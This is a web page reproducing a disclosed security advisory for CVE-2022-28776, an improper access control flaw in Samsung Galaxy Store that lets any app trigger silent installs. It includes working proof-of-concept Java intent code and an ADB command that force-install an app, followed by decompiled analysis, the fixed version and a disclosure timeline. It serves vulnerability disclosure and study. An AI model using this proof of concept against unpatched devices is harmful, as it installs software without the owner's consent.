<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung Galaxy Store Arbitrary Application Install | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung Galaxy Store Arbitrary Application Install" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper access control vulnerability in Galaxy Store prior to version 4.5.36.4 allows attacker to install applications from Galaxy Store without user interactions." />
<meta property="og:description" content="Improper access control vulnerability in Galaxy Store prior to version 4.5.36.4 allows attacker to install applications from Galaxy Store without user interactions." />
<link rel="canonical" href="https://maliciouserection.com/cves/2022-04-01_cve-2022-28776/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2022-04-01_cve-2022-28776/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-04-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung Galaxy Store Arbitrary Application Install" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-01T00:00:00+00:00","datePublished":"2022-04-01T00:00:00+00:00","description":"Improper access control vulnerability in Galaxy Store prior to version 4.5.36.4 allows attacker to install applications from Galaxy Store without user interactions.","headline":"Samsung Galaxy Store Arbitrary Application Install","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2022-04-01_cve-2022-28776/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2022-04-01_cve-2022-28776/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung Galaxy Store Arbitrary Application Install</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-galaxy-any-app-can-install-any-app">Original post: <a href="https://labs.f-secure.com/advisories/samsung-galaxy-any-app-can-install-any-app/">https://labs.f-secure.com/advisories/samsung-galaxy-any-app-can-install-any-app/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store prior to version 4.5.36.4</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-28776</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. The Galaxy App Store contained an issue with how it handled specific intents. When an intent was sent to one of three exported activities, the Galaxy App Store would create a new intent, while taking all of the calling intent’s extras and packaging them with the new intent. This new intent could then be manipulated in such a way that the Galaxy App Store would be forced to automatically install other applications onto the victim’s device without consent.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>The following exported activities could have been used to exploit this issue:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code></li>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.interim.essentials.InterimEssentialsActivity</code></li>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.downloadableapps.DownloadableAppsActivity</code></li>
</ul>

<p>As an example, the following Java code could have been used by a third party application to automatically install the application “Pokemon Go”. This code uses the Java class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.sec.android.app.samsungapps", "com.sec.android.app.samsungapps.viewpager.InterimActivity"));
intent.putExtra("directcall", true);
intent.putExtra("isInternal", true);
intent.putExtra("directInstall", true);
intent.putExtra("installReferrer", "com.sec.android.app.samsungapps");
intent.putExtra("directOpen", true);
intent.putExtra("GUID", "com.nianticlabs.pokemongo.ares");
startActivity(intent);
</code></pre></div></div>

<p>Alternatively, the following ADB command could have been used to install the application “Pokemon Go”. This command also uses the Java class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>am start -n com.sec.android.app.samsungapps/com.sec.android.app.samsungapps.viewpager.InterimActivity --ez directcall true --ez isInternal true --ez directInstall true --es installReferrer com.sec.android.app.samsungapps --ez directOpen true --es GUID com.nianticlabs.pokemongo.ares
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<p>Each of the exploitable exported classes contains code that parses the calling intent and creates:</p>

<ul>
  <li>a data URI that starts with <code class="language-plaintext highlighter-rouge">samsungapps://CategoryList/</code></li>
  <li>extracts the intent extras and adds an additional extra Boolean <code class="language-plaintext highlighter-rouge">isFromInterim</code> and sets it to True (though this extra does not get used later)</li>
</ul>

<p>The data URI and extras are passed to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.util.DeeplinkUtil</code> method <code class="language-plaintext highlighter-rouge">openInternalDeeplink</code>. To show this, below is the code found in class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.interim.essentials.InterimEssentialsActivity</code> method <code class="language-plaintext highlighter-rouge">a</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private void a() {
    Bundle extras = getIntent().getExtras();
    if (extras == null) {
        extras = new Bundle();
    }
    extras.putBoolean(DeepLink.EXTRA_DEEPLINK_IS_FROM_INTERIM, true);
    DeeplinkUtil deeplinkUtil = new DeeplinkUtil(this);
    deeplinkUtil.openInternalDeeplink("samsungapps://CategoryList/" + Constant.GALAXY_ESSENTIALS, extras);
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">openInternalDeepLink</code> creates a new intent, adds the previously captured extras to the intent and adds an extra string sender value of <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code>. Thenewly created intent is sent to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DeepLinkFactory</code> method <code class="language-plaintext highlighter-rouge">createDeepLink</code> which will return a deeplink, and set the deeplink as an internal deeplink:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean openInternalDeeplink(String str, Bundle bundle) {
    if (!Common.isValidString(str)) {
       return false;
    }
    Intent intent = new Intent();
    intent.putExtra("sender", this.activity.getPackageName());
    intent.setData(Uri.parse(str));
    if (bundle != null) {
        intent.putExtras(bundle);
    }
    DeepLink createDeepLink = DeepLinkFactory.createDeepLink(intent);
    if (createDeepLink == null) {
        return false;
    }
    createDeepLink.setIsInternal(true);
    DeeplinkManager.getInstance().setInternalDeeplink(true);
    DeepLinkFactoryUtil.sendDeeplinkLaunchingLog(createDeepLink.getDeeplinkUrl(), true);
    return createDeepLink.runInternalDeepLink(this.a);
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">createdeeplink</code> creates a “Product Detail Deeplink” deeplink. This deeplink contains all of the extras that were set in the intent:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public static DeepLink createDeepLink(final Intent intent) {
    try {
        final boolean booleanExtra = intent.getBooleanExtra("directcall", false);
        final String stringExtra = intent.getStringExtra("GUID");
        final Bundle extras = intent.getExtras();
        if (booleanExtra &amp;&amp; stringExtra != null &amp;&amp; stringExtra.length() != 0) {
            final StringBuilder sb = new StringBuilder();
            sb.append("[GADeepLink] ::directcall::");
            sb.append(stringExtra);
            AppsLog.d(sb.toString());
            return DeepLinkFactoryUtil.createProductDetailDeepLink(stringExtra, extras);
        }
</code></pre></div></div>

<p>DeepLink parameters are set via class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.utility.deeplink</code>. DeepLink which sets different values based on the passed intent extras, such as <code class="language-plaintext highlighter-rouge">directInstall</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void initialize(Bundle bundle) {
    ...
    this.u = getBundleBoolean(bundle, EXTRA_DEEPLINK_DIRECT_INSTALL, false);
    ...
</code></pre></div></div>

<p>The application then automatically processes the newly created “Product Detail Deeplink” deeplink as if it was a standard deeplink. While processing, the class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink. DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">runInternalDeeplink</code> is called, which looks for intent extras such as <code class="language-plaintext highlighter-rouge">directInstall</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean runInternalDeepLink(Context context) {
    AppsLog.d(this.a + "::runInternalDeepLink::");
    if (launchApp(context, getDetailID())) {
        return true;
    }
    if (this.isStickerApp) {
        DetailPageHelper.launchStickerDetailFromDeeplink(context, getDetailID(), this.d, getAdSource(), getDeeplinkUrl());
        return true;
    }
    DetailConstant.DETAIL_TYPE detail_type = DetailConstant.DETAIL_TYPE.COMMON;
    if (isForGear()) {
        detail_type = DetailConstant.DETAIL_TYPE.GEAR;
    } else if (a()) {
        detail_type = DetailConstant.DETAIL_TYPE.GAME;
    }
    DetailPageHelper.launchDetailFromDeeplink(context, getDetailID(), detail_type, this.mSignId, this.mQueryStr, getAdSource(), this.b, getSender(), isDirectInstall(), isDirectOpen(), getType(), this.f, getDeeplinkUrl(), this.mEncodedReferrer);
    return true;
}
</code></pre></div></div>

<p>Similar to the bug outlined in <a href="https://yogehi.github.io/cves/cve-2022-22288.html">https://yogehi.github.io/cves/cve-2022-22288.html</a>, class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">putDetailCommonExtra</code> is eventually called again:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void putDetailCommonExtra(Context context) {
    ...
    if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) {
        this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall());
        this.intent.putExtra("sender", getSender());
    }
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">enableDDI</code> is called again, but this time it will return true due to the calling intent being an internal deeplink:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) {
    if (isDDITestMode()) {
        return true;
    }
    if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) {
        return false;
    }
    return true;
}
</code></pre></div></div>

<p>Since <code class="language-plaintext highlighter-rouge">enableDDI</code> returns true, the target application gets installed.</p>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released the Galaxy Store version 4.5.36.4 which addresses this issue. Users should update their Galaxy Store application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>17/10/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>17/10/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>22/11/2021</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>13/02/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>12/04/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/05/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
